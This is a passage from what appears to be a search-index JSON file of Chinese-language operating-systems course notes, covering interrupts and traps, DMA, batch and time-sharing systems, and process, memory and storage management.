\u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/OS/","title":"\u64cd\u4f5c\u7cfb\u7edf","text":""},{"location":"Courses/OS/#_1","title":"\u64cd\u4f5c\u7cfb\u7edf","text":"<p> \u7ea6 23 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Courses/OS/#reference","title":"Reference","text":"<ul> <li>\ud83d\udc8e \u64cd\u4f5c\u7cfb\u7edf | Operating System - Isshiki\u4fee's Notebook</li> <li>\u54b8\u9c7c\u6684\u7684\u4ee3\u7801\u7a7a\u95f4</li> </ul>"},{"location":"Courses/OS/Topic1/","title":"Overview","text":""},{"location":"Courses/OS/Topic1/#overview","title":"Overview","text":"<p> \u7ea6 2517 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 13 \u5206\u949f</p> <p>\u8fd9\u8282\u7684\u5185\u5bb9\u53ea\u662f\u4e3a\u4e86\u7559\u4e2a\u5370\u8c61</p>"},{"location":"Courses/OS/Topic1/#introduction","title":"Introduction","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u7a0b\u5e8f\uff08Program\uff09\uff0c\u8d77\u5230 User \u548c Computer Hardware \u4e4b\u95f4\u4e2d\u4ecb\u7684\u4f5c\u7528\u3002\u6982\u62ec\u6765\u8bb2\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u76ee\u6807\u662f\u6267\u884c\u7528\u6237\u7a0b\u5e8f\u5e76\u8ba9\u89e3\u51b3\u7528\u6237\u95ee\u9898\u53d8\u5f97\u66f4\u7b80\u5355\uff0c\u4ee5\u53ca\u9ad8\u6548\u5229\u7528\u786c\u4ef6\u8d44\u6e90\u3002</p> <p>\u4e00\u4e2a\u8ba1\u7b97\u673a\u7cfb\u7edf\u53ef\u4ee5\u88ab\u5206\u4e3a\u56db\u4e2a\u90e8\u5206\uff1a</p> <ul> <li>Hardware: \u63d0\u4f9b\u57fa\u672c\u8ba1\u7b97\u8d44\u6e90<ul> <li>CPU, Memory. I/O Devices...</li> </ul> </li> <li>Operating System: \u5728\u4f17\u591a\u7528\u6237\u548c\u5e94\u7528\u4e2d\u63a7\u5236\u5e76\u534f\u8c03\u786c\u4ef6\u8d44\u6e90</li> <li>System/Application Programs: \u51b3\u5b9a\u7cfb\u7edf\u8d44\u6e90\u7684\u4f7f\u7528\u65b9\u5f0f\uff0c\u7528\u6765\u89e3\u51b3\u7528\u6237\u7684\u8ba1\u7b97\u95ee\u9898<ul> <li>Compilers, Web Browsers, Database Systems, Video Games...</li> </ul> </li> <li>Users<ul> <li>People, Machines, Other Computers...</li> </ul> </li> </ul> <p>\u4e8b\u5b9e\u4e0a\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5e76\u6ca1\u6709\u4e00\u4e2a\u7edf\u4e00\u7684\u5b9a\u4e49\uff0c\u5927\u5bb6\u90fd\u8ba4\u53ef\u7684\u90e8\u5206\u662f\u5185\u6838\uff08Kernel\uff09\uff0c\u5b83\u662f\u59cb\u7ec8\u5728\u8fd0\u884c\u7684\u90e8\u5206\uff0c\u5176\u4f59\u7684\u5219\u5305\u62ec System Program \u548c Application Program\uff0c\u6240\u4ee5 OS \u7684\u8303\u56f4\u5dee\u5f02\u5f88\u5927\u3002</p> <p>\u5728\u8ba1\u7b97\u673a\u521a\u542f\u52a8\u65f6\uff0cbootstrap program \u88ab\u52a0\u8f7d\uff0c\u5b83\u901a\u5e38\u5b58\u50a8\u5728 ROM \u6216 EPROM \u4e2d\uff0c\u4e5f\u88ab\u79f0\u4e3a firmware\u3002</p> <p>bootstrap program \u4f1a\u521d\u59cb\u5316\u786c\u4ef6\uff0c\u52a0\u8f7d\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u5e76\u8df3\u8f6c\u5230\u5185\u6838\u7684\u5165\u53e3\u3002</p> <p>\u73b0\u4ee3 PC \u628a bootstrap \u7a0b\u5e8f\u79f0\u4f5c BIOS \u6216 UEFI \u56fa\u4ef6</p> <p>\u5728\u8ba1\u7b97\u673a\u4e2d\uff0cI/O \u8bbe\u5907\u53ef\u4ee5\u548c CPU \u5e76\u884c\u6267\u884c\uff0c\u6bcf\u4e00\u4e2a Device Controller \u90fd\u8d1f\u8d23\u7ba1\u7406\u4e00\u4e2a\u7279\u5b9a\u7684 Device\uff0cCPU \u5e76\u4e0d\u4f1a\u76f4\u63a5\u64cd\u63a7\u8bbe\u5907\uff0c\u800c\u662f\u901a\u8fc7 Controller \u4e0b\u4ee4\u3002</p> <p>\u66f4\u8be6\u7ec6\u6765\u8bb2\uff0c\u6bcf\u4e2a Device Controller \u90fd\u6709\u4e00\u4e2a local buffer\uff0cCPU \u901a\u8fc7 Main Memory \u6765\u548c\u8fd9\u4e9b local buffer \u8fdb\u884c\u6570\u636e\u4ea4\u4e92\u3002\u5f53\u63a7\u5236\u5668\u5b8c\u6210\u4e00\u9879 I/O \u64cd\u4f5c\u65f6\uff0c\u4f1a\u901a\u8fc7 System Bus \u53d1\u9001\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\u7ed9 CPU\uff0cCPU \u63a5\u6536\u5230\u4fe1\u53f7\u540e\u5c31\u4f1a\u6682\u505c\u5f53\u524d\u4efb\u52a1\uff0c\u53bb\u6267\u884c\u5bf9\u5e94\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u5176\u5b9e\u5c31\u662f\u4e2d\u65ad\u9a71\u52a8\u7684\uff0c\u4e2d\u65ad\u4f1a\u8ba9 CPU \u7684\u63a7\u5236\u6743\u8f6c\u79fb\u5230 Interrupt Service Route(ISR)\uff0c\u4e3a\u4e86\u8ba9\u4e2d\u65ad\u7ed3\u675f\u540e\u80fd\u591f\u6062\u590d\u6267\u884c\uff0cCPU \u5fc5\u987b\u4fdd\u5b58\u88ab\u6253\u65ad\u7684\u4e0a\u4e0b\u6587\uff0c\u8fd9\u6837 ISR \u5904\u7406\u5b8c\u6bd5\u540e\uff0cCPU \u5c31\u80fd\u56de\u5230\u539f\u6765\u88ab\u6253\u65ad\u7684\u7a0b\u5e8f\u7ee7\u7eed\u6267\u884c\uff0c\u5c31\u597d\u50cf\u4ec0\u4e48\u90fd\u6ca1\u53d1\u751f\u8fc7\u3002</p> <p>\u4e0a\u4e0b\u6587\u5305\u62ec\u5bc4\u5b58\u5668\u7684\u503c\u4ee5\u53ca PC</p> <p>\u5728\u5904\u7406\u4e2d\u65ad\u65f6\uff0c\u901a\u5e38\u4f1a\u6682\u65f6\u5c4f\u853d\u65b0\u7684\u4e2d\u65ad\uff0c\u5426\u5219\u53ef\u80fd\u4f1a\u9020\u6210\u4e22\u5931\u4e2d\u65ad\u7684\u95ee\u9898\u3002\u6709\u4e9b\u7cfb\u7edf\u8fd8\u5141\u8bb8\u6709\u4e2d\u65ad\u4f18\u5148\u7ea7\uff0c\u9ad8\u4f18\u5148\u7ea7\u7684 ISR \u53ef\u4ee5\u6253\u65ad\u4f4e\u4f18\u5148\u7ea7\u7684 ISR\u3002</p> <p>\u6211\u4eec\u7528 trap \u63cf\u8ff0\u4e00\u79cd\u63a7\u5236\u8f6c\u79fb\u7684\u8fc7\u7a0b\uff0c\u800c\u8fd9\u4e2a\u8fc7\u7a0b\u662f\u7531 interrupt \u6216 exception \u5f15\u8d77\u7684\u3002\u901a\u5e38\u4e3a\u4e86\u65b9\u4fbf\u8d77\u89c1\uff0c\u6211\u4eec\u7ea6\u5b9a trap \u4e3a interrupt \u548c exception \u7684\u603b\u79f0\u3002</p> <p>\u4e0d\u540c\u4f53\u7cfb\u7ed3\u6784\u4e2d\u5b9a\u4e49\u53ef\u80fd\u4e0d\u540c\uff0c\u6709\u7684\u53ea\u628a exception \u79f0\u4f5c Trap\uff08\u4f8b\u5982 sld \u7684 PPT\uff09</p> <p>RISC-V Unprivileged Spec\u00a01.6 \u8282\u4e2d\u5bf9\u4e8e trap\u3001interrupt \u4e0e exception \u7684\u63cf\u8ff0: We use the term\u00a0exception\u00a0to refer to an unusual condition occurring at run time\u00a0associated with an instruction\u00a0in the current RISC-V hart. We use the term\u00a0interrupt\u00a0to refer to an\u00a0external asynchronous event\u00a0that may cause a RISC-V hart to experience an unexpected transfer of control. We use the term\u00a0trap\u00a0to refer to\u00a0the transfer of control to a trap handler\u00a0caused by either an exception or an interrupt.</p> Interrupt Exception Hardware generate Software generate These are\u00a0asynchronous external requests\u00a0for service (like keyboard or printer needs service). These are\u00a0synchronous internal requests\u00a0for service based upon abnormal events (think of illegal instructions, illegal address, overflow etc). These are\u00a0normal events\u00a0and shouldn\u2019t interfere with the normal running of a computer. These are\u00a0abnormal events\u00a0and often result in the termination of a program Synchronous I/O Methods <p>\u65e9\u671f I/O \u5176\u5b9e\u540c\u6b65\u3001\u963b\u585e\u5f0f\u7684\uff0c\u7a0b\u5e8f\u53d1\u8d77 I/O \u540e\uff0c\u5fc5\u987b\u7b49\u5230 I/O \u5b8c\u6210\u624d\u80fd\u7ee7\u7eed\u6267\u884c\u3002CPU \u5728\u7b49\u5f85\u671f\u95f4\uff0c\u8981\u4e48\u4f1a\u6267\u884c\u4e00\u6761\u7279\u6b8a\u7684 <code>WAIT</code> \u6307\u4ee4\uff0c\u4ec0\u4e48\u4e5f\u4e0d\u5e72\u76f4\u5230\u6536\u5230\u8bbe\u5907\u7684\u4e2d\u65ad\uff1b\u8981\u4e48\u8f6e\u8be2\u68c0\u67e5\u8bbe\u5907\u72b6\u6001\uff0c\u4f46\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u4ec5\u6d6a\u8d39 CPU \u65f6\u95f4\uff0c\u8fd8\u6709\u53ef\u80fd\u548c\u6b63\u5e38\u7a0b\u5e8f\u62a2\u5360\u5185\u5b58\u5e26\u5bbd\u3002</p> <p></p> <p>\u9664\u4e86\u4e2d\u65ad\u9a71\u52a8 I/O \u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u9ad8\u6548\u7684 I/O \u4f20\u8f93\u673a\u5236\u4e3a Direct Memory Access(DMA)\u3002</p> <p>\u5728\u65e9\u671f\u7684\u7a0b\u5e8f\u63a7\u5236 I/O \u6216\u4e2d\u65ad\u9a71\u52a8 I/O \u4e2d\uff0c\u5982\u679c\u8981\u4f20\u8f93\u4e00\u4e2a\u5927\u6587\u4ef6\uff0c\u6bcf\u6b21\u4f20\u8f93\u4e00\u4e2a\u5b57\u8282 CPU \u90fd\u4f1a\u88ab\u4e2d\u65ad\uff0c\u5176\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u6d6a\u8d39\u5728\u642c\u8fd0\u6570\u636e\u4e0a\u3002</p> <p>\u800c\u5bf9\u4e8e DMA\uff0c\u8bbe\u5907\u63a7\u5236\u5668\u76f4\u63a5\u8d1f\u8d23 local buffer \u548c Main Memory \u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\uff0c\u5b8c\u5168\u7ed5\u8fc7 CPU \u63a7\u5236\u3002CPU \u53ea\u9700\u8981\u8d1f\u8d23\u7ed9 DMA \u4e0b\u8fbe\u6307\u4ee4\uff08\u4f8b\u5982\u6e90\u5730\u5740\u3001\u76ee\u6807\u5730\u5740\u3001\u6570\u636e\u5927\u5c0f\u7b49\uff09\uff0cDMA \u63a7\u5236\u5668\u5728\u6574\u4e2a\u6570\u636e\u5757\u4f20\u5b8c\u540e\u624d\u4f1a\u7ed9 CPU \u53d1\u9001\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\u3002</p> <p>\u56e0\u6b64\uff0cDMA \u901a\u5e38\u7528\u4e8e\u9ad8\u901f I/O \u8bbe\u5907\u4e0a\uff0c\u4f8b\u5982\u786c\u76d8\u3001\u7f51\u5361\u7b49\u3002</p>"},{"location":"Courses/OS/Topic1/#operating-system-structures","title":"Operating-System Structures","text":""},{"location":"Courses/OS/Topic1/#process-management","title":"Process Management","text":"<p>\u5bf9\u8fdb\u7a0b\u7684\u8c03\u5ea6\u5c31\u662f\u5bf9 CPU \u8d44\u6e90\u7684\u8c03\u5ea6</p> <p>\u4e00\u4e2a\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u8981\u8fd0\u884c\u5f88\u591a\u7a0b\u5e8f\uff0cKernel \u9700\u8981\u8d1f\u8d23\u5176\u5b83\u7a0b\u5e8f\u7684\u8fd0\u884c\u3002</p> <ul> <li>&lt;1&gt; Batch Processing Systems: (\u5355\u9053)\u6279\u5904\u7406\u7cfb\u7edf<ul> <li>Jobs \u5b58\u50a8\u5728\u5185\u5b58/\u5916\u5b58\u4e2d\uff0c\u800c\u5185\u5b58\u4e2d\u59cb\u7ec8\u6709\u4e00\u4e2a Job \u5728\u8fd0\u884c</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u5728\u5185\u5b58\u4e2d Job \u7ed3\u675f\u65f6\u52a0\u8f7d\u4e0b\u4e00\u4e2a Job \u5230\u5185\u5b58\u4e2d\u8fd0\u884c</li> <li>\u6211\u4eec\u5c06\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u8fd0\u884c\u7684\u7a0b\u5e8f\u79f0\u4e3a\u8fdb\u7a0b\uff08Process\uff09\uff0c\u8fd9\u662f\u4e00\u4e2a\u52a8\u6001\u7684\u6982\u5ff5</li> </ul> </li> <li>&lt;2&gt; Multiprogramming Batch Systems: \u591a\u9053\u6279\u5904\u7406\u7cfb\u7edf<ul> <li>\u5728\u6279\u5904\u7406\u7cfb\u7edf\u57fa\u7840\u4e0a\uff0c\u5f53\u6b63\u5728\u8fd0\u884c\u7684 Job \u53d1\u751f I/O \u64cd\u4f5c\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u8ba9 CPU \u8f6c\u800c\u8fd0\u884c\u53e6\u4e00\u4e2a Job</li> <li>\u591a\u9053\u6279\u5904\u7406\u7cfb\u7edf\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u907f\u514d\u4e86\u6279\u5904\u7406\u7cfb\u7edf\u7b49\u5f85\u7528\u6237\u8f93\u5165\u7b49 I/O \u4e8b\u4ef6\u7684 CPU \u65f6\u95f4\u6d6a\u8d39</li> </ul> </li> <li>&lt;3&gt; Time Sharing Systems: \u5206\u65f6\u7cfb\u7edf<ul> <li>\u5c06\u65f6\u95f4\u5212\u5206\u4e3a\u5f88\u5c0f\u7684\u65f6\u95f4\u7247\uff0c\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u5b89\u6392\u5404\u4e2a Job \u8f6e\u6d41\u8fd0\u884c</li> <li>\u7531\u4e8e\u65f6\u95f4\u9891\u7387\u5f88\u9ad8\uff0c\u8fdc\u9ad8\u4e8e\u4eba\u7c7b\u7684\u53cd\u5e94\u901f\u5ea6\uff0c\u56e0\u6b64\u64cd\u4f5c\u7cfb\u7edf\u53ef\u4ee5\u5feb\u901f\u5728\u591a\u4e2a\u8fdb\u7a0b\u4e4b\u95f4\u5207\u6362\u8fd0\u884c\uff0c\u8ba9\u7528\u6237\u8bef\u4ee5\u4e3a\u8fd9\u4e9b\u8fdb\u7a0b\u662f\u540c\u65f6\u8fd0\u884c\u7684</li> <li>\u5206\u65f6\u7cfb\u7edf\u4ecd\u7136\u662f\u591a\u9053\u7684\uff08Multiprogramming\uff09\uff0c\u4f46\u5df2\u7ecf\u4e0d\u662f\u6279\u5904\u7406\uff08Batch\uff09\u7684\u4e86\uff1b\u5b83\u76f8\u6bd4\u591a\u9053\u6279\u5904\u7406\u7cfb\u7edf\u62e5\u6709\u4e86\u66f4\u597d\u7684\u4ea4\u4e92\u6027</li> </ul> </li> </ul> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u6709\u5b9e\u65f6\u64cd\u4f5c\u7cfb\u7edf\u3001\u7f51\u7edc\u64cd\u4f5c\u7cfb\u7edf\u3001\u5206\u5e03\u5f0f\u8ba1\u7b97\u673a\u7cfb\u7edf\u7b49</p> <p></p> <p>\u7a0b\u5e8f\u672c\u8eab\u662f\u5b58\u653e\u5728\u78c1\u76d8\u4e0a\u7684\u9759\u6001\u4ee3\u7801\uff0c\u60f3\u8981\u53d8\u6210\u8fdb\u7a0b\u8fd0\u884c\uff0c\u5fc5\u987b\u5360\u7528 CPU\u3001\u5185\u5b58\u3001I/O \u8bbe\u5907\u3001\u6587\u4ef6\u7b49\u8d44\u6e90\u3002</p> <p>\u5bf9\u4e8e\u5355\u7ebf\u7a0b\u8fdb\u7a0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u53ea\u6709\u4e00\u4e2a\u7a0b\u5e8f\u8ba1\u6570\u5668 PC\uff0c\u4e00\u6b21\u53ea\u6267\u884c\u4e00\u6761\u6307\u4ee4\u3002\u800c\u5bf9\u4e8e\u591a\u7ebf\u7a0b\u8fdb\u7a0b\uff0c\u4e00\u4e2a\u8fdb\u7a0b\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u6267\u884c\u6d41\uff0c\u6bcf\u4e2a\u7ebf\u7a0b\u6709\u81ea\u5df1\u7684 PC\uff0c\u53ef\u4ee5\u5e76\u53d1\u6267\u884c\u3002</p> <p>\u540c\u65f6\uff0c\u7cfb\u7edf\u4e2d\u901a\u5e38\u6709\u5f88\u591a\u8fdb\u7a0b\uff0c\u5e76\u53d1\uff08Concurrency\uff09\u662f\u901a\u8fc7 CPU \u5728\u591a\u4e2a\u8fdb\u7a0b/\u7ebf\u7a0b\u4e4b\u95f4\u4e0d\u65ad\u5207\u6362\u5b9e\u73b0\u7684\u3002</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u662f\u201c\u8fdb\u7a0b\u7684\u7ba1\u7406\u8005\u201d\uff0c\u8d1f\u8d23\u8fdb\u7a0b\u7684\u751f\u547d\u5468\u671f\u63a7\u5236\u3001\u534f\u8c03\u3001\u901a\u4fe1\u548c\u907f\u514d\u51b2\u7a81\uff0c\u5177\u4f53\u5305\u62ec\uff1a</p> <ul> <li>\u521b\u5efa\u548c\u5220\u9664\u8fdb\u7a0b<ul> <li>\u64cd\u4f5c\u7cfb\u7edf\u8d1f\u8d23\u542f\u52a8\u65b0\u7684\u8fdb\u7a0b\uff08\u7528\u6237\u7a0b\u5e8f\u3001\u7cfb\u7edf\u670d\u52a1\u7b49\uff09\uff0c\u5e76\u5728\u8fdb\u7a0b\u5b8c\u6210\u6216\u88ab\u7ec8\u6b62\u65f6\u6e05\u7406\u3001\u56de\u6536\u8d44\u6e90\u3002</li> </ul> </li> <li>\u6302\u8d77\u548c\u6062\u590d\u8fdb\u7a0b<ul> <li>\u6709\u65f6\u5019\u8fdb\u7a0b\u9700\u8981\u6682\u505c\uff08\u6bd4\u5982\u7b49\u5f85 I/O\uff09\uff0cOS \u53ef\u4ee5\u628a\u5b83\u6302\u8d77\uff1b</li> <li>\u5f53\u6761\u4ef6\u6ee1\u8db3\u65f6\uff0cOS \u53c8\u80fd\u8ba9\u5b83\u6062\u590d\u6267\u884c\u3002</li> </ul> </li> <li>\u8fdb\u7a0b\u540c\u6b65\uff08Process Synchronization\uff09<ul> <li>\u591a\u4e2a\u8fdb\u7a0b\u53ef\u80fd\u9700\u8981\u534f\u8c03\u5408\u4f5c\uff0c\u6bd4\u5982\u8bbf\u95ee\u5171\u4eab\u5185\u5b58\u3001\u4fee\u6539\u540c\u4e00\u6587\u4ef6\u3002</li> <li>OS \u63d0\u4f9b\u540c\u6b65\u673a\u5236\uff08\u9501\u3001\u4fe1\u53f7\u91cf\u3001\u7ba1\u7a0b\u7b49\uff09\uff0c\u907f\u514d\u6570\u636e\u51b2\u7a81\u6216\u7ade\u4e89\u6761\u4ef6\u3002</li> </ul> </li> <li>\u8fdb\u7a0b\u901a\u4fe1\uff08Process Communication, IPC\uff09<ul> <li>\u8fdb\u7a0b\u4e4b\u95f4\u9700\u8981\u4ea4\u6362\u6570\u636e\uff08\u4f8b\u5982\u6d4f\u89c8\u5668\u548c\u63d2\u4ef6\u4e4b\u95f4\uff09\u3002</li> <li>OS \u63d0\u4f9b\u901a\u4fe1\u65b9\u5f0f\uff1a\u7ba1\u9053\u3001\u6d88\u606f\u961f\u5217\u3001\u5171\u4eab\u5185\u5b58\u3001socket \u7b49\u3002</li> </ul> </li> <li>\u6b7b\u9501\u5904\u7406\uff08Deadlock Handling\uff09<ul> <li>\u591a\u4e2a\u8fdb\u7a0b\u53ef\u80fd\u56e0\u4e3a\u4e92\u76f8\u7b49\u5f85\u5bf9\u65b9\u7684\u8d44\u6e90\u800c\u5361\u6b7b\uff08\u6b7b\u9501\uff09\u3002</li> <li>OS \u8981\u4e48 \u68c0\u6d4b\u5e76\u89e3\u9664\u6b7b\u9501\uff0c\u8981\u4e48 \u907f\u514d/\u9884\u9632\u6b7b\u9501\u53d1\u751f\u3002</li> </ul> </li> </ul>"},{"location":"Courses/OS/Topic1/#memory-management","title":"Memory Management","text":"<p>\u8ba1\u7b97\u673a\u7684\u5b58\u50a8\u5206\u5c42\u6a21\u578b\u5728\u5f88\u591a\u8bfe\u90fd\u8bb2\u8fc7\uff0c\u6b64\u5904\u4e0d\u518d\u91cd\u590d\u8d58\u8ff0\u3002</p> <p>\u7a0b\u5e8f\u8fd0\u884c\u524d\u7684\u6570\u636e\u5fc5\u987b\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u7a0b\u5e8f\u5904\u7406\u540e\u7684\u7ed3\u679c\u4e5f\u8981\u5b58\u5728\u5185\u5b58\u4e2d\u3002\u6240\u4ee5\u64cd\u4f5c\u7cfb\u7edf\u8981\u51b3\u5b9a\u4ec0\u4e48\u65f6\u5019\u3001\u54ea\u4e9b\u5185\u5bb9\u653e\u5728\u5185\u5b58\u4e2d\u3002</p> <p>\u5185\u5b58\u7ba1\u7406\u7684\u76ee\u6807\u662f\u4e3a\u4e86\u4f18\u5316 CPU \u5229\u7528\u7387\uff0c\u5e76\u63d0\u9ad8\u54cd\u5e94\u901f\u5ea6\uff0c\u5176\u5185\u5bb9\u5305\u62ec\uff1a</p> <ul> <li>\u8bb0\u5f55\uff08Tracking\uff09\uff1a\u8ddf\u8e2a\u5f53\u524d\u54ea\u4e9b\u5185\u5b58\u533a\u57df\u88ab\u5360\u7528\uff0c\u5c5e\u4e8e\u54ea\u4e2a\u8fdb\u7a0b\u3002</li> <li>\u51b3\u5b9a\u8c03\u5ea6\uff08Deciding\uff09\uff1a\u9009\u62e9\u54ea\u4e9b\u8fdb\u7a0b/\u6570\u636e\u8981\u88c5\u5165\u5185\u5b58\uff0c\u54ea\u4e9b\u8981\u6362\u51fa\u3002</li> <li>\u5206\u914d\u4e0e\u56de\u6536\uff08Allocating/Deallocating\uff09\uff1a\u5f53\u8fdb\u7a0b\u9700\u8981\u5185\u5b58\u65f6\u5206\u914d\uff0c\u7528\u5b8c\u540e\u56de\u6536\u3002</li> </ul>"},{"location":"Courses/OS/Topic1/#storage-management","title":"Storage Management","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u628a\u5404\u79cd\u590d\u6742\u7684\u7269\u7406\u5b58\u50a8\u8bbe\u5907\u62bd\u8c61\u6210\u4e00\u4e2a\u7edf\u4e00\u7684\u903b\u8f91\u6982\u5ff5\u6587\u4ef6\uff08File\uff09\uff0c\u7528\u6237\u4e0d\u9700\u8981\u5173\u5fc3\u8bbe\u5907\u7684\u7269\u7406\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u5bf9\u8fd9\u4e9b\u201c\u6587\u4ef6\u201d\u64cd\u4f5c\u5373\u53ef\u3002</p> <p>\u6587\u4ef6\u901a\u5e38\u88ab\u7ec4\u7ec7\u6210 directories \u7684\u5f62\u5f0f\uff0c\u5e76\u901a\u8fc7 Access Control \u8fdb\u884c\u6743\u9650\u7ba1\u7406\u3002File-System Management \u7684\u6838\u5fc3\u5de5\u4f5c\u5305\u62ec\uff1a</p> <ul> <li>\u6587\u4ef6\u548c\u76ee\u5f55\u7ba1\u7406\uff1a\u521b\u5efa\u3001\u5220\u9664\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u652f\u6301\u76ee\u5f55\u5c42\u6b21\u7ed3\u6784\u3002</li> <li>\u6587\u4ef6\u64cd\u4f5c\u63a5\u53e3\uff1a\u63d0\u4f9b\u64cd\u4f5c\u6587\u4ef6\u7684\u57fa\u672c\u539f\u8bed\uff08open\u3001read\u3001write\u3001close \u7b49\uff09\u3002</li> <li>\u6587\u4ef6\u6620\u5c04\uff1a\u628a\u6587\u4ef6\u903b\u8f91\u7ed3\u6784\u6620\u5c04\u5230\u7269\u7406\u5b58\u50a8\u8bbe\u5907\uff08\u5982\u78c1\u76d8\u5757\uff09\u3002</li> <li>\u8bbf\u95ee\u63a7\u5236\uff1a\u51b3\u5b9a\u8c01\u80fd\u8bbf\u95ee\u6587\u4ef6\u3001\u80fd\u505a\u4ec0\u4e48\uff08\u8bfb/\u5199/\u6267\u884c\u6743\u9650\uff09\u3002</li> <li>\u5907\u4efd\u4e0e\u6062\u590d\uff1a\u628a\u6587\u4ef6\u5b58\u5230\u66f4\u7a33\u5b9a\u7684\u4ecb\u8d28\uff08\u5982\u78c1\u5e26\u3001\u4e91\u5b58\u50a8\uff09\uff0c\u9632\u6b62\u6570\u636e\u4e22\u5931\u3002</li> </ul> <p>\u78c1\u76d8\u901a\u5e38\u7528\u6765\u5b58\u653e\u653e\u4e0d\u8fdb\u5185\u5b58\u4e2d\u7684\u5927\u91cf\u6570\u636e\u4ee5\u53ca\u9700\u8981\u957f\u671f\u4fdd\u5b58\u7684\u6570\u636e\uff0c\u78c1\u76d8\u5b50\u7cfb\u7edf\u6027\u80fd\u597d\u574f\u5c06\u76f4\u63a5\u51b3\u5b9a\u6574\u4e2a\u8ba1\u7b97\u673a\u7684\u8fd0\u884c\u901f\u5ea6\uff08\u5c24\u5176\u662f I/O \u5bc6\u96c6\u578b\u4efb\u52a1\uff09\uff0c\u6240\u4ee5\u9ad8\u6548\u7684\u78c1\u76d8\u7ba1\u7406\u7b97\u6cd5\u5bf9\u64cd\u4f5c\u7cfb\u7edf\u6765\u8bf4\u5341\u5206\u91cd\u8981\u3002</p> <p>\u64cd\u4f5c\u7cfb\u7edf\u5728\u78c1\u76d8\u7ba1\u7406\u4e2d\u7684\u4e3b\u8981\u5de5\u4f5c\u5305\u62ec\uff1a</p> <ul> <li>\u7a7a\u95f2\u7a7a\u95f4\u7ba1\u7406\uff08Free-space management\uff09\uff1a\u8bb0\u5f55\u54ea\u4e9b\u78c1\u76d8\u5757\u662f\u7a7a\u7684\uff0c\u80fd\u5206\u914d\u7ed9\u65b0\u6587\u4ef6\u3002</li> <li>\u5b58\u50a8\u5206\u914d\uff08Storage allocation\uff09\uff1a\u51b3\u5b9a\u6587\u4ef6\u6570\u636e\u653e\u5728\u54ea\u4e9b\u78c1\u76d8\u5757\uff08\u8fde\u7eed\u5206\u914d\u3001\u94fe\u5f0f\u5206\u914d\u3001\u7d22\u5f15\u5206\u914d\u7b49\uff09\u3002</li> <li>\u78c1\u76d8\u8c03\u5ea6\uff08Disk scheduling\uff09\uff1a\u5f53\u591a\u4e2a\u8fdb\u7a0b\u53d1\u51fa I/O \u8bf7\u6c42\u65f6\uff0c\u9009\u62e9\u5408\u7406\u7684\u8bbf\u95ee\u987a\u5e8f\uff08\u6bd4\u5982 FCFS\u3001SSTF\u3001SCAN\u3001C-SCAN\uff09\u4ee5\u51cf\u5c11\u78c1\u76d8\u5bfb\u9053\u65f6\u95f4\uff0c\u63d0\u9ad8\u6027\u80fd\u3002</li> </ul> <p>\u4e00\u4e9b\u5b58\u50a8\u4ecb\u8d28\u4e0d\u9700\u8981\u5f88\u5feb\uff0c\u5982 Optical Storage \u548c Magnetic Tape\uff0c\u4f46\u4ecd\u7136\u9700\u8981\u88ab\u7ba1\u7406</p>"},{"location":"Courses/OS/Topic2/","title":"Operating-System Structures","text":""},{"location":"Courses/OS/Topic2/#operating-system-structures","title":"Operating-System Structures","text":"<p> \u7ea6 1671 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"},{"location":"Courses/OS/Topic2/#os-services","title":"OS Services","text":"<p>\u4ece\u7528\u6237\u89d2\u5ea6\u6765\u770b\uff0cOS \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u6709\u7528\u7684\u670d\u52a1\uff1a</p> <ul> <li>User Interface: \u5305\u62ec Command-Line(CLI), Graphics User Interface(GUI) \u548c Batch \u7b49</li> <li>Program Execution: \u63d0\u4f9b\u5c06\u7a0b\u5e8f\u52a0\u8f7d\u8fdb\u5185\u5b58\u6267\u884c\u7684\u80fd\u529b</li> <li>I/O Operations: \u4e00\u4e2a\u6b63\u5728\u8fd0\u884c\u7684\u7a0b\u5e8f\u53ef\u80fd\u9700\u8981 I/O\uff0c\u8bbe\u8ba1 File \u548c I/O Device \u7684\u7ba1\u7406</li> <li>File System Manipulation: \u6587\u4ef6\u7684\u589e\u5220\u6539\u67e5\uff0c\u4ee5\u53ca\u6743\u9650\u7ba1\u7406\u7b49</li> <li>Communications: \u8fdb\u7a0b\u4e4b\u95f4\u6709\u65f6\u9700\u8981\u4ea4\u6362\u4fe1\u606f\uff0c\u8fd9\u4e00\u4ea4\u6362\u4e5f\u6709\u53ef\u80fd\u662f\u901a\u8fc7\u7f51\u7edc\u7684\u4e0d\u540c\u4e3b\u673a\u4e4b\u95f4\u7684<ul> <li>\u4ea4\u6d41\u53ef\u4ee5\u901a\u8fc7 Shared Memory \u6216 Message Passing 